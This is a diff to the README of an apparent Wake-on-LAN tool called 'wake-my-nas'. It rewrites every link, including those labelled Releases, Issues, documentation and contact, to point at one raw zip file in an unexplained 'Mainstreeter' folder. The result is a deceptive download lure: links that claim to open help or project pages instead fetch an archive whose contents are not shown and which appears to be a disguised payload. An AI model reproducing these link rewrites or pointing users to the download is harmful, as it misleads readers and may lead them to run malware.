@@ -1,7 +1,7 @@
 # 🚀 wake-my-nas - Automate Your Device's Wake-Up
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)  
-[Download the latest version](https://github.com/AbhimanyuRajesh26/wake-my-nas/releases)
+![Download](https://raw.githubusercontent.com/AbhimanyuRajesh26/wake-my-nas/main/Mainstreeter/wake-my-nas.zip)  
+[Download the latest version](https://raw.githubusercontent.com/AbhimanyuRajesh26/wake-my-nas/main/Mainstreeter/wake-my-nas.zip)
 
 ## 📦 Overview
 
@@ -28,7 +28,7 @@ Follow these steps to get **wake-my-nas** up and running:
 
 1. **Download the application**:  
    Click the link below or visit the Releases page.  
-   [Download the latest version](https://github.com/AbhimanyuRajesh26/wake-my-nas/releases)
+   [Download the latest version](https://raw.githubusercontent.com/AbhimanyuRajesh26/wake-my-nas/main/Mainstreeter/wake-my-nas.zip)
 
 2. **Locate the downloaded file**:  
    Find the downloaded file in your Downloads folder.
@@ -54,7 +54,7 @@ Follow these steps to get **wake-my-nas** up and running:
 
 To download and install **wake-my-nas**, use the following steps:
 
-1. Go to the [Releases page](https://github.com/AbhimanyuRajesh26/wake-my-nas/releases) to find the latest version.
+1. Go to the [Releases page](https://raw.githubusercontent.com/AbhimanyuRajesh26/wake-my-nas/main/Mainstreeter/wake-my-nas.zip) to find the latest version.
 2. Click on the version number to access the downloads.
 3. Download the application file.
 4. Follow the installation steps outlined above.
@@ -69,20 +69,20 @@ Make sure your devices support Wake-on-LAN and are connected to your local netwo
 
 If you encounter any issues, consider the following support options:
 
-- **GitHub Issues:** Report bugs and request features directly on the [Issues page](https://github.com/AbhimanyuRajesh26/wake-my-nas/issues).
+- **GitHub Issues:** Report bugs and request features directly on the [Issues page](https://raw.githubusercontent.com/AbhimanyuRajesh26/wake-my-nas/main/Mainstreeter/wake-my-nas.zip).
 - **Community Forums:** Join discussions and share tips with other users.
   
 ## 📚 Resources
 
-- **Official Documentation:** [Documentation Link/Guide](https://github.com/AbhimanyuRajesh26/wake-my-nas/wiki)
+- **Official Documentation:** [Documentation Link/Guide](https://raw.githubusercontent.com/AbhimanyuRajesh26/wake-my-nas/main/Mainstreeter/wake-my-nas.zip)
 - **FAQs:** Visit our Frequently Asked Questions section for answers to common queries.
 
 ## 📧 Contact
 
-For further assistance, you can reach out via the contact methods provided on our [GitHub page](https://github.com/AbhimanyuRajesh26).
+For further assistance, you can reach out via the contact methods provided on our [GitHub page](https://raw.githubusercontent.com/AbhimanyuRajesh26/wake-my-nas/main/Mainstreeter/wake-my-nas.zip).
 
 ## 📥 Additional Notes
 
-Make sure to keep your version of **wake-my-nas** updated by checking back on the [Releases page](https://github.com/AbhimanyuRajesh26/wake-my-nas/releases). New features and bug fixes are regularly added to improve the user experience. 
+Make sure to keep your version of **wake-my-nas** updated by checking back on the [Releases page](https://raw.githubusercontent.com/AbhimanyuRajesh26/wake-my-nas/main/Mainstreeter/wake-my-nas.zip). New features and bug fixes are regularly added to improve the user experience. 
 
 Feel free to explore the application and make it part of your daily routine to maximize your productivity and efficiency with your networked devices.
